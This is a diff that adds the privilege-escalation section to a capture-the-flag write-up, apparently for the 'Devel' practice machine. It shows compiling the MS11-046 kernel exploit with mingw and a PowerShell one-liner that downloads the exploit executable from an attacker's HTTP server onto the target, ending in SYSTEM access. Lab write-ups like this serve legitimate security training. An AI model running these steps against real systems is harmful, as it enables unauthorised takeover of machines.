@@ -80,7 +80,41 @@ as **windwos-exploit suggestor** suggests us a bunch of exploit.
 So let's try MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege.  
 
 It didnt work.  
-let's try another exploit [MS11-046](https://www.exploit-db.com/download/40564)  
+let's try another exploit [MS11-046](https://www.exploit-db.com/download/40564) 
+
+When we download this we will get 40564 file change it to 40564.c  
+Then we have to compile it   
+`i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32`
+
+If mingw32 is not installed install it  
+sudo apt-get install mingw32  
+
+Now transfer the MS11-046.exe to devel machine using powershell command.  
+`powershell -c "(new-object System.Net.WebClient).DownloadFile('http://ip:8000/MS11-046.exe', 'c:\Users\Public\Downloads\MS11-046.exe')"`
+
+![](/photos/devel-photos/sh.png)
+
+Now we are **nt authority\system**
+
+![](/photos/devel-photos/nt.png)
+
+Now we can access everything in the devel machine.  
+let's enumerate the user.txt flag  
+
+We got the **user.txt** flag.
+
+![](/photos/devel-photos/user.png)
+
+**Root.txt** flag
+
+![](/photos/devel-photos/root.png)
+
+We have rooted this machine.
+
+### Thank you
+
+Author : Hardik Chugh
+
 
 
 
